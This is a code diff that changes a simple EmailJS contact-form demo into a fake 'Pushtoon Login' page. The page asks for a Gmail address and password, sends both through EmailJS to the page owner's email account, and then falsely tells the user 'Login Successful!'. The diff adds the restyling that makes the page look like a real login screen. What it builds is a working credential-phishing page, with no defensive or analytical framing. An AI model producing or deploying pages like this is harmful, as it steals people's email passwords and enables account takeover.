@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>EmailJS Demo</title>
+  <title>Pushtoon Login</title>
 
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 
@@ -19,49 +19,57 @@
       justify-content:center;
       align-items:center;
       font-family:Arial, sans-serif;
-      background: linear-gradient(135deg, #ff6ec4, #7873f5);
+
+      /* Background Image */
+      background-image:url("https://images.unsplash.com/photo-1506744038136-46273834b3fb");
+      background-size:cover;
+      background-position:center;
     }
 
     .container{
-      background:white;
+      background:rgba(255,255,255,0.92);
       padding:40px;
       border-radius:20px;
       width:350px;
       text-align:center;
-      box-shadow:0px 10px 25px rgba(0,0,0,0.2);
+      box-shadow:0px 10px 25px rgba(0,0,0,0.4);
+      backdrop-filter:blur(5px);
     }
 
     h2{
-      color:#444;
-      margin-bottom:20px;
+      color:#6a1b9a;
+      margin-bottom:25px;
+      font-size:35px;
     }
 
     input{
       width:90%;
-      padding:12px;
-      margin:10px 0;
+      padding:14px;
+      margin:12px 0;
       border:2px solid #ddd;
-      border-radius:10px;
+      border-radius:12px;
       font-size:16px;
       outline:none;
       transition:0.3s;
     }
 
     input:focus{
-      border-color:#7873f5;
-      box-shadow:0 0 10px rgba(120,115,245,0.5);
+      border-color:#6a1b9a;
+      box-shadow:0 0 12px rgba(106,27,154,0.5);
     }
 
     button{
       width:95%;
-      padding:12px;
+      padding:14px;
       border:none;
-      border-radius:10px;
-      background:linear-gradient(135deg, #ff6ec4, #7873f5);
+      border-radius:12px;
+      background:linear-gradient(135deg, #ff9800, #ff5722);
       color:white;
-      font-size:18px;
+      font-size:20px;
       cursor:pointer;
       transition:0.3s;
+      font-weight:bold;
+      margin-top:10px;
     }
 
     button:hover{
@@ -76,21 +84,17 @@
 
 <div class="container">
 
-  <h2>Login Form</h2>
+  <!-- Changed color/title -->
+  <h2>LOGIN</h2>
 
-  <!-- Gmail first -->
+  <!-- Gmail -->
   <input type="email" id="email" placeholder="Enter your Gmail">
 
-  <!-- Password second -->
-  <input type="password" id="password" placeholder="Enter password">
+  <!-- Password -->
+  <input type="password" id="password" placeholder="Enter Password">
 
-  <!-- Name third -->
-  <input type="text" id="name" placeholder="Enter name">
-
-  <!-- Message fourth -->
-  <input type="text" id="message" placeholder="Enter message">
-
-  <button onclick="sendMail()">Send</button>
+  <!-- Login Button -->
+  <button onclick="sendMail()">LOG IN</button>
 
 </div>
 
@@ -100,20 +104,16 @@ function sendMail(){
 
     let email = document.getElementById("email").value;
     let password = document.getElementById("password").value;
-    let name = document.getElementById("name").value;
-    let message = document.getElementById("message").value;
 
     // Validation
-    if(email === "" || password === "" || name === "" || message === ""){
+    if(email === "" || password === ""){
         alert("Please fill all fields!");
         return;
     }
 
     let params = {
         email: email,
-        password: password,
-        name: name,
-        message: message
+        password: password
     };
 
     emailjs.send(
@@ -122,7 +122,7 @@ function sendMail(){
         params
     )
     .then(function(response){
-        alert("Email Sent Successfully!");
+        alert("Login Successful!");
     })
     .catch(function(error){
         alert("FAILED");
